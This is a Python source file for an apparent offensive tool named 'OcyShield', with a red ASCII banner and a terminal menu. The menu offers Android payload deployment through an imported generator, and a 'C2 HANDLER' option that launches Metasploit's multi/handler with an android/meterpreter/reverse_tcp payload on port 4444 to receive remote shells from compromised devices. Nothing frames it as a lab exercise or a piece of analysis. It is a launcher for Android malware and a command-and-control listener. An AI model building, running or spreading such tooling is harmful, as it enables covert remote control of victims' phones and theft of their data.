import os
import sys
import time
from core.utils.logger import log_status, log_error
from modules.payloads.android import generate_android_payload

def boot_sequence():
    """Real-time terminal boot simulation"""
    os.system('clear')
    boot_logs = [
        "[*] LOADING OCYSHIELD KERNEL V2.1...",
        "[*] MOUNTING NETWORK INTERFACES...",
        "[*] SYNCING DATABASE WITH github.com/ocytos",
        "[*] ENCRYPTING SESSION DATA...",
        "[*] STATUS: SYSTEM READY."
    ]
    for log in boot_logs:
        for char in log:
            sys.stdout.write(f"\033[31m{char}\033[0m")
            sys.stdout.flush()
            time.sleep(0.01)
        print()
    time.sleep(0.5)

def banner():
    """Red Aggressive Banner - Matches your UI"""
    os.system('clear')
    print("\033[1;31m")
    print(r"""
      ██████╗  ██████╗██╗   ██╗███████╗██╗  ██╗██╗███████╗██╗     ██████╗ 
     ██╔═══██╗██╔════╝╚██╗ ██╔╝██╔════╝██║  ██║██║██╔════╝██║     ██╔══██╗
     ██║   ██║██║      ╚████╔╝ ███████╗███████║██║█████╗  ██║     ██║  ██║
     ██║   ██║██║       ╚██╔╝  ╚════██║██╔══██║██║██╔══╝  ██║     ██║  ██║
     ╚██████╔╝╚██████╗   ██║   ███████║██║  ██║██║███████╗███████╗██████╔╝
      ╚═════╝  ╚═════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝
    """)
    print("      S U P P O R T :  G I T H U B . C O M / O C Y T O S")
    print("      " + "━" * 63)
    print("\033[0m")

def main_menu():
    boot_sequence()
    while True:
        banner()
        # Menu options matching your layout
        print("      \033[31m[\033[0m 01 \033[31m]\033[0m  PAYLOAD DEPLOYMENT")
        print("      \033[31m[\033[0m 02 \033[31m]\033[0m  C2 HANDLER")
        print("      \033[31m[\033[0m 03 \033[31m]\033[0m  DIAGNOSTICS")
        print("      \033[31m[\033[0m 00 \033[31m]\033[0m  TERMINATE")
        
        print("\n\033[1;31m      ocy@shield:~\033[0m")
        try:
            choice = input("      \033[1;31m$\033[0m ").strip()
        except EOFError: break

        if choice in ["1", "01"]:
            log_status("Accessing Deployment Engine...")
            generate_android_payload()
            input("\n      [#] TASK FINISHED. PRESS ENTER...")
            
        elif choice in ["2", "02"]:
            log_status("Launching C2 Infrastructure...")
            os.system("msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit'")
            
        elif choice in ["3", "03"]:
            log_status("Running System Diagnostics...")
            os.system("sudo python3 setup.py")
            input("\n      [#] DIAGNOSTICS COMPLETE. PRESS ENTER...")

        elif choice in ["0", "00"]:
            print("\n      [!] DISCONNECTING...")
            sys.exit(0)
        else:
            print("\n      \033[31m[X] ERROR: INVALID_COMMAND\033[0m")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print("\n\n      [!] SESSION TERMINATED.")
        sys.exit(0)
